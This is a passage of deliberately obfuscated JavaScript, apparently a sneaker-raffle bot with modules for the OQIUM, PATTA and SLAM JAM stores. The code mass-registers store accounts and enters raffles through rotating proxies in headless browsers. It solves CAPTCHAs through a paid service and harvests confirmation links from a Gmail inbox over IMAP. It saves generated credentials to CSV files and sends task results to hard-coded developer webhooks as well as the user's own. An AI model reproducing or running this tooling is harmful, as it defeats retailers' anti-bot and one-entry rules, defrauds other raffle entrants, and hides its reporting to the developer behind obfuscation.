                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x469900, _0x17ed02, _0x17d10a) {
                    var _0x17ed02 = [];
                    async function _0x495560() {
                        var _0x4e9836 = new _0x9597be({
                            'user': _0x9a51aa['masterMail'],
                            'password': _0x9a51aa['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2ad625(_0x14e929) {
                            _0x4e9836['openBox']('INBOX', ![], _0x14e929);
                        }
                        _0x4e9836['once']('ready', function () {
                            _0x2ad625(function (_0x8ba47e, _0x597afd) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x8ba47e)
                                    throw _0x8ba47e;
                                _0x4e9836['seq']['search'](['UNSEEN'], function (_0xf46d44, _0x3771cc) {
                                    if (!_0x3771cc || !_0x3771cc['length'])
                                        console['log'](_0x38a61b() + '\x20[' + _0x469900['name'] + ']\x20No\x20mails\x20found'), _0x4e9836['end']();
                                    else {
                                        var _0x2f82c4 = _0x4e9836['seq']['fetch'](_0x3771cc, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2f82c4['on']('message', function (_0x2c2e94, _0x199c41) {
                                            var _0x2cd3fa = '(#' + _0x199c41 + ')\x20';
                                            _0x2c2e94['on']('body', function (_0x19e01a, _0x281408) {
                                                _0x45ab86(_0x19e01a, (_0x4d0a2f, _0x26dde9) => {
                                                    if (_0x26dde9['subject'] == 'Confirm\x20Your\x20Subscription' && _0x26dde9['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x5aa61f = _0x26dde9['text']['split']('(')[0x1], _0xa6f0d3 = _0x5aa61f['split'](')')[0x0];
                                                        _0x17ed02['push'](_0xa6f0d3);
                                                    }
                                                });
                                            }), _0x2c2e94['once']('end', function () {
                                            });
                                        }), _0x2f82c4['once']('error', function (_0x184f44) {
                                            console['log']('Fetch\x20error:\x20' + _0x184f44);
                                        }), _0x2f82c4['once']('end', function () {
                                            _0x4e9836['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4e9836['once']('error', function (_0x3a4e23) {
                            console['log'](_0x3a4e23);
                        }), _0x4e9836['once']('end', async function () {
                        }), _0x4e9836['connect']();
                    }
                    async function _0x2e72d5(_0x49ed6b, _0x209bea, _0x302a45) {
                        for (var _0xf28f79 = 0x0; _0xf28f79 < _0x209bea['length']; _0xf28f79++) {
                            async function _0x50c889(_0x33c61f, _0x433dde, _0x503f59, _0x820a0a, _0x4a4ece) {
                                var _0xa657c0, _0x35a647 = {}, _0x1285e3 = [], _0x128c67 = {}, _0x40dc36 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2f13fb = Math['round'](Math['random']() * (_0x40dc36['length'] - 0x1));
                                _0x820a0a[_0x33c61f]['Size'] == 'RANDOM' && (_0x820a0a[_0x33c61f]['Size'] = _0x40dc36[_0x2f13fb]);
                                !_0x820a0a && (_0x820a0a = {});
                                if (_0x9a51aa['useRandomProxy'] = ![])
                                    var _0x2bd863 = _0x4a4ece[_0x33c61f]['split'](':');
                                else
                                    var _0x55af15 = Math['round'](Math['random']() * (_0x4a4ece['length'] - 0x1)), _0x2bd863 = _0x4a4ece[_0x55af15]['split'](':');
                                var _0xe378bd = {
                                    'jar': _0x3720c0,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x503f59['url'],
                                    'headers': _0x503f59['headers'],
                                    'body': JSON['stringify'](_0x35a647),
                                    'proxy': 'http://' + _0x2bd863[0x2] + ':' + _0x2bd863[0x3] + '@' + _0x2bd863[0x0] + ':' + _0x2bd863[0x1]
                                };
                                return _0x433dde != 'ver' && (_0xe378bd['url'] = _0x503f59['url'], _0xe378bd['headers'] = _0x503f59['headers']), _0x433dde == 'ver' && (_0xe378bd['method'] = 'GET', _0xe378bd['url'] = _0x820a0a[_0x33c61f]), new Promise(function (_0x1517f0, _0x4b09d5) {
                                    callback = async (_0x319427, _0x4682df, _0x4ad553) => {
                                        if (!_0x319427 && _0x4682df['statusCode'] == 0xca || !_0x319427 && _0x4682df['statusCode'] == 0xc8) {
                                            if (_0x433dde != 'ver') {
                                                var _0x18fde8 = await _0x23dc1b(_0x820a0a[_0x33c61f], _0x503f59, 'dev', ![]), _0x5cbd4f = await _0x23dc1b(_0x820a0a[_0x33c61f], _0x503f59, 'pub', ![]);
                                                const _0x42cfc5 = {
                                                    'succesDEVMSG': { 'embeds': [_0x18fde8] },
                                                    'succesPUBMSG': { 'embeds': [_0x5cbd4f] }
                                                };
                                                if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                                                    try {
                                                        await _0x4236dd(_0x9a51aa['webhook'], _0x42cfc5['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x42cfc5['succesDEVMSG']), await _0xbbd9dc(0xc8);
                                                try {
                                                    await _0x4236dd(_0x4d6262, _0x42cfc5['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5d1d0f(_0x820a0a[_0x33c61f], _0x503f59);
                                            }
                                            _0x1517f0(console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x503f59['name'] + ']\x20Task\x20' + (_0x33c61f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x433dde != 'ver') {
                                                var _0x135e3e = '' + _0x319427, _0x2cfb52 = await _0x23dc1b(_0x820a0a[_0x33c61f], _0x503f59, 'dev', !![], _0x135e3e), _0x39428d = {};
                                                _0x39428d['errorDEV'] = { 'embeds': [_0x2cfb52] }, _0xc8d9fd(_0x820a0a[_0x33c61f], _0x503f59), _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x39428d['errorDEV']), await _0x4236dd(_0x48c50b, _0x39428d['errorDEV']);
                                            }
                                            _0x4b09d5(console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x503f59['name'] + ']\x20Task\x20' + (_0x33c61f + 0x1) + ':\x20' + _0x319427)));
                                        }
                                    };
                                    try {
                                        _0x433dde != 'ver' ? console['log'](_0x38a61b() + '\x20[' + _0x503f59['name'] + ']\x20Task\x20' + (_0x33c61f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x35a647['data']['attributes']['email']) : console['log'](_0x38a61b() + '\x20[' + _0x503f59['name'] + ']\x20Task\x20' + (_0x33c61f + 0x1) + ':\x20Fetching\x20Response'), _0x355e6b(_0xe378bd, callback);
                                    } catch (_0x902e2c) {
                                        console['log'](_0x38a61b() + '\x20Task\x20' + (_0x33c61f + 0x1) + ':\x20' + _0x902e2c);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x50c889(_0xf28f79, 'ver', _0x49ed6b, _0x209bea, _0x302a45), console['log'](_0x38a61b() + '\x20[' + _0x49ed6b['name'] + ']\x20Sleeping\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                            } catch (_0x10918b) {
                            }
                        }
                    }
                    try {
                        _0x495560(), await _0xbbd9dc(0xfa0), console['log']('Found\x20' + _0x17ed02['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2e72d5(_0x469900, _0x17ed02, _0x17d10a);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x31291e, _0x10d5b1, _0x5e9880) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2ad5ff = 0x0; _0x2ad5ff < _0x10d5b1['length']; _0x2ad5ff++) {
                        var _0x149933 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x213f4d
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x9a51aa['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x198625
                                }
                            ]
                        }];
                        const _0x16b682 = { 'embeds': _0x149933 };
                        _0x1f02d2(_0x31291e['name'] + '\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20/\x20' + _0x10d5b1['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x10d5b1, _0x2ad5ff);
                        var _0x12969e = await _0x23dc1b(_0x10d5b1[_0x2ad5ff], _0x31291e, 'acc', ![]);
                        const _0x2b238c = { 'succesDEVMSG': { 'embeds': [_0x12969e] } };
                        if (_0x10d5b1[_0x2ad5ff]['Email'] == '' || _0x10d5b1[_0x2ad5ff]['FirstName'] == '' || _0x10d5b1[_0x2ad5ff]['LastName'] == '') {
                            console['log'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xbbd9dc(0x7d0);
                            continue;
                        }
                        (_0x10d5b1[_0x2ad5ff]['Password'] == '' || _0x10d5b1[_0x2ad5ff] == undefined) && _0x10d5b1[_0x2ad5ff]['Password'] == 'JRaffles23!';
                        if (_0x9a51aa['useRandomProxy'] = ![])
                            var _0x313989 = _0x5e9880[_0x2ad5ff]['split'](':');
                        else
                            var _0x38413a = Math['round'](Math['random']() * (_0x5e9880['length'] - 0x1)), _0x313989 = _0x5e9880[_0x38413a]['split'](':');
                        const _0x370754 = await _0x6d7b51['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x313989[0x0] + ':' + _0x313989[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x33f4d3 = await _0x370754['newPage']();
                            await _0x33f4d3['authenticate']({
                                'username': '' + _0x313989[0x2],
                                'password': '' + _0x313989[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0x31291e['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33f4d3['setRequestInterception'](!![]), _0x33f4d3['on']('request', _0x237771 => {
                                _0x237771['resourceType']() === 'image' || _0x237771['resourceType']() === 'font' || _0x237771['resourceType']() === 'media' ? _0x237771['abort']() : _0x237771['continue']();
                            }), await _0x33f4d3['goto']('https://patta.nl/account/register'), await _0xbbd9dc(0xbb8), await _0x33f4d3['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x38a61b() + '\x20[' + _0x31291e['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20Filling\x20information'), await _0x33f4d3['type']('#RegisterForm-FirstName', '' + _0x10d5b1[_0x2ad5ff]['FirstName']), await _0xbbd9dc(0x226), await _0x33f4d3['type']('#RegisterForm-LastName', '' + _0x10d5b1[_0x2ad5ff]['LastName']), await _0xbbd9dc(0x226), await _0x33f4d3['type']('#RegisterForm-email', '' + _0x10d5b1[_0x2ad5ff]['Email']), await _0xbbd9dc(0x226), await _0x33f4d3['type']('#RegisterForm-password', '' + _0x10d5b1[_0x2ad5ff]['Password']), await _0xbbd9dc(0x226), console['log'](_0x38a61b() + '\x20[' + _0x31291e['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20Submitting..'), await _0x33f4d3['$eval']('#RegisterForm', _0x20a1c4 => _0x20a1c4['submit']()), await _0xbbd9dc(0x1f40);
                            try {
                                await _0x33f4d3['waitForSelector']('.home-page-grid__collection'), await _0xbbd9dc(0x1f4), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x31291e['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20Account\x20' + _0x10d5b1[_0x2ad5ff]['Email'] + '\x20Generated!')), _0x80a504['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x10d5b1[_0x2ad5ff]['Email'] + ',' + _0x10d5b1[_0x2ad5ff]['Password']), console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x31291e['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20Account\x20' + _0x10d5b1[_0x2ad5ff]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x2b238c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4236dd(_0xe1dcb8, _0x2b238c['succesDEVMSG']);
                            } catch (_0x2e988d) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x2e988d));
                            }
                        } catch (_0x144c60) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x2ad5ff + 0x1) + '\x20:\x20' + _0x144c60));
                        } finally {
                            _0x370754 && _0x370754['close'](), console['log']('Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3330cb, _0x5b85a1, _0x2297e6) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20c20f = 0x0; _0x20c20f < _0x5b85a1['length']; _0x20c20f++) {
                        var _0x12f8f1;
                        if (_0x24d30e != 'yes')
                            var _0x24d30e = '', _0x377234 = 0x0;
                        _0x1f02d2(_0x3330cb['name'] + '\x20Task\x20' + (_0x20c20f + 0x1) + '\x20/\x20' + _0x5b85a1['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x5b85a1, _0x20c20f);
                        if (_0x5b85a1[_0x20c20f]['Email'] == '' || _0x5b85a1[_0x20c20f]['Password'] == '' || _0x5b85a1[_0x20c20f]['FirstName'] == '' || _0x5b85a1[_0x20c20f]['LastName'] == '') {
                            console['log'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x9a51aa['useRandomProxy'] = ![])
                            var _0x45d0d7 = _0x2297e6[_0x20c20f]['split'](':');
                        else
                            var _0x88a365 = Math['round'](Math['random']() * (_0x2297e6['length'] - 0x1)), _0x45d0d7 = _0x2297e6[_0x88a365]['split'](':');
                        const _0x378510 = await _0x6d7b51['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x45d0d7[0x0] + ':' + _0x45d0d7[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x4c2b01 = await _0x378510['newPage']();
                            await _0x4c2b01['authenticate']({
                                'username': '' + _0x45d0d7[0x2],
                                'password': '' + _0x45d0d7[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4c2b01['setRequestInterception'](!![]), _0x4c2b01['on']('request', _0x3d6a28 => {
                                _0x3d6a28['resourceType']() === 'image' || _0x3d6a28['resourceType']() === 'font' || _0x3d6a28['resourceType']() === 'media' ? _0x3d6a28['abort']() : _0x3d6a28['continue']();
                            }), await _0x4c2b01['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4c2b01['waitForSelector']('#CustomerEmail'), console['log'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4c2b01['type']('#CustomerEmail', '' + _0x5b85a1[_0x20c20f]['Email']), await _0xbbd9dc(0x12c), await _0x4c2b01['type']('#CustomerPassword', '' + _0x5b85a1[_0x20c20f]['Password']), await _0xbbd9dc(0x226), await _0x4c2b01['$eval']('#customer_login', _0x524067 => _0x524067['submit']());
                            try {
                                await _0x4c2b01['waitForSelector']('#orders'), await _0xbbd9dc(0x4b0);
                            } catch {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4c2b01['goto']('' + _0x5b85a1[_0x20c20f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xbbd9dc(0xbb8), console['log'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4c2b01['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x4c2b01['type']('#email', '' + _0x5b85a1[_0x20c20f]['Email']), await _0xbbd9dc(0x384), await _0x4c2b01['type']('#first_name', '' + _0x5b85a1[_0x20c20f]['FirstName']), await _0xbbd9dc(0x514), await _0x4c2b01['type']('#last_name', '' + _0x5b85a1[_0x20c20f]['LastName']), await _0xbbd9dc(0x514), await _0x4c2b01['type']('#street_address', _0x5b85a1[_0x20c20f]['Address1'] + '\x20' + _0x5b85a1[_0x20c20f]['HouseNumber'] + '\x20' + _0x5b85a1[_0x20c20f]['Address2']), await _0xbbd9dc(0x2bc);
                            _0x5b85a1[_0x20c20f]['Postcode'] == undefined && (_0x5b85a1[_0x20c20f]['Postcode'] = _0x5b85a1[_0x20c20f]['Zip']);
                            await _0x4c2b01['type']('#zip_code', '' + _0x5b85a1[_0x20c20f]['Postcode']), await _0xbbd9dc(0x320), await _0x4c2b01['type']('#city', '' + _0x5b85a1[_0x20c20f]['City']), await _0xbbd9dc(0x320), await _0x4c2b01['type']('#bday', '01/01/1994'), await _0xbbd9dc(0x320), await _0x4c2b01['type']('#instagram', '' + _0x5b85a1[_0x20c20f]['Follower']), await _0xbbd9dc(0x352);
                            if (_0x5b85a1[_0x20c20f]['Size'] == 'RANDOM') {
                                const _0x5d2f7d = await _0x4c2b01['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2b33e6 => {
                                    return _0x2b33e6['map'](_0x4159bf => _0x4159bf['textContent']);
                                });
                                var _0x1d61ba = Math['round'](Math['random']() * (_0x5d2f7d['length'] - 0x1));
                                console['log'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x5d2f7d[_0x1d61ba]), await _0x4c2b01['click']('label[data-eu-size=\x22' + _0x5d2f7d[_0x1d61ba] + '\x22]');
                            } else {
                                console['log'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x5b85a1[_0x20c20f]['Size']);
                                try {
                                    await _0x4c2b01['click']('label[data-eu-size=\x22' + _0x5b85a1[_0x20c20f]['Size'] + '\x22]');
                                } catch {
                                    await _0x4c2b01['click']('label[data-eu-size=\x22' + _0x5b85a1[_0x20c20f]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xbbd9dc(0xbb8), await _0x4c2b01['$$eval']('.raffle__checkbox-label', _0x33dc4e => _0x33dc4e['forEach'](_0x12afeb => _0x12afeb['click']())), await _0xbbd9dc(0x7d0), console['log'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4c2b01['click']('#raffle__form-submit'), await _0xbbd9dc(0x1388);
                            try {
                                await _0x4c2b01['waitForSelector']('#raffle__confirmation-message-container'), _0x24d30e = 'no', _0x5d1d0f(_0x5b85a1[_0x20c20f], _0x3330cb), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x5bce68) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x5bce68));
                            }
                        } catch (_0x4e9dc1) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20' + _0x4e9dc1)), _0x24d30e = 'yes';
                        } finally {
                            _0x378510 && _0x378510['close']();
                            if (_0x24d30e == 'yes' && _0x377234 != 0x5 && _0x12f8f1 != 'Size\x20Not\x20Found') {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x3330cb['name'] + ']\x20Task\x20' + (_0x20c20f + 0x1) + '\x20:\x20Retrying')), _0x20c20f = _0x20c20f - 0x1, _0x377234 = _0x377234 + 0x1;
                                continue;
                            }
                            _0x24d30e == 'yes' && _0x377234 >= 0x5 && (_0xc8d9fd(_0x5b85a1[_0x20c20f], _0x3330cb), _0x24d30e = 'no', _0x377234 = 0x0), console['log']('Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x14da30, _0x4727cf, _0x46104b) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x424d77 = 0x0; _0x424d77 < _0x4727cf['length']; _0x424d77++) {
                        if (_0x27bafe != 'yes')
                            var _0x27bafe = '', _0x3aae40 = 0x0;
                        var _0x4ae04e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x213f4d
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x9a51aa['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x198625
                                }
                            ]
                        }];
                        const _0x571994 = { 'embeds': _0x4ae04e };
                        _0x1f02d2(_0x14da30['name'] + '\x20Task\x20' + (_0x424d77 + 0x1) + '\x20/\x20' + _0x4727cf['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x4727cf, _0x424d77);
                        var _0x5d57a1 = await _0x23dc1b(_0x4727cf[_0x424d77], _0x14da30, 'acc', ![]);
                        const _0x5d5058 = { 'succesDEVMSG': { 'embeds': [_0x5d57a1] } };
                        if (_0x4727cf[_0x424d77]['Email'] == '' || _0x4727cf[_0x424d77]['FirstName'] == '' || _0x4727cf[_0x424d77]['LastName'] == '') {
                            console['log'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xbbd9dc(0x7d0);
                            continue;
                        }
                        (_0x4727cf[_0x424d77]['Password'] == '' || _0x4727cf[_0x424d77] == undefined) && _0x4727cf[_0x424d77]['Password'] == 'JRaffles23!';
                        if (_0x9a51aa['useRandomProxy'] = ![])
                            var _0x5261a0 = _0x46104b[_0x424d77]['split'](':');
                        else
                            var _0x1e9f4f = Math['round'](Math['random']() * (_0x46104b['length'] - 0x1)), _0x5261a0 = _0x46104b[_0x1e9f4f]['split'](':');
                        const _0x37768c = await _0x6d7b51['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5261a0[0x0] + ':' + _0x5261a0[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x12d1ce = await _0x37768c['newPage']();
                            await _0x12d1ce['authenticate']({
                                'username': '' + _0x5261a0[0x2],
                                'password': '' + _0x5261a0[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x12d1ce['setRequestInterception'](!![]), _0x12d1ce['on']('request', _0xc90839 => {
                                _0xc90839['resourceType']() === 'image' || _0xc90839['resourceType']() === 'font' || _0xc90839['resourceType']() === 'media' ? _0xc90839['abort']() : _0xc90839['continue']();
                            }), await _0x12d1ce['goto']('https://drop.slamjam.com/account/register'), await _0xbbd9dc(0xbb8), await _0x12d1ce['waitForSelector']('#FirstName'), await _0x12d1ce['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x12d1ce['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Filling\x20information'), await _0xbbd9dc(0x4b0), await _0x12d1ce['type']('#FirstName', '' + _0x4727cf[_0x424d77]['FirstName']), await _0xbbd9dc(0x226), await _0x12d1ce['type']('#LastName', '' + _0x4727cf[_0x424d77]['LastName']), await _0xbbd9dc(0x226), await _0x12d1ce['type']('#Email', '' + _0x4727cf[_0x424d77]['Email']), await _0xbbd9dc(0x2ee), await _0x12d1ce['type']('#ConfirmEmail', '' + _0x4727cf[_0x424d77]['Email']), await _0xbbd9dc(0x2ee), await _0x12d1ce['type']('#CreatePassword', '' + _0x4727cf[_0x424d77]['Password']), await _0xbbd9dc(0x2ee), await _0x12d1ce['type']('#CreateConfirmPassword', '' + _0x4727cf[_0x424d77]['Password']), await _0xbbd9dc(0x226), console['log'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Submitting..'), await _0x12d1ce['$eval']('#create_customer', _0x1676c7 => _0x1676c7['submit']()), await _0xbbd9dc(0x1388), console['log'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20' + _0x19e6c5['cyan']('Solving\x20Captcha')), await _0x12d1ce['solveRecaptchas'](), console['log'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x12d1ce['$eval']('.shopify-challenge__container\x20>\x20form', _0x28c681 => _0x28c681['submit']());
                            try {
                                await _0x12d1ce['waitForSelector']('.product-card__image'), await _0xbbd9dc(0x1f4), _0x27bafe = 'no', console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Account\x20' + _0x4727cf[_0x424d77]['Email'] + '\x20Generated!')), _0x80a504['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x4727cf[_0x424d77]['Email'] + ',' + _0x4727cf[_0x424d77]['Password']), console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Account\x20' + _0x4727cf[_0x424d77]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x5d5058['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4236dd(_0xe1dcb8, _0x5d5058['succesDEVMSG']);
                            } catch (_0x7eeabb) {
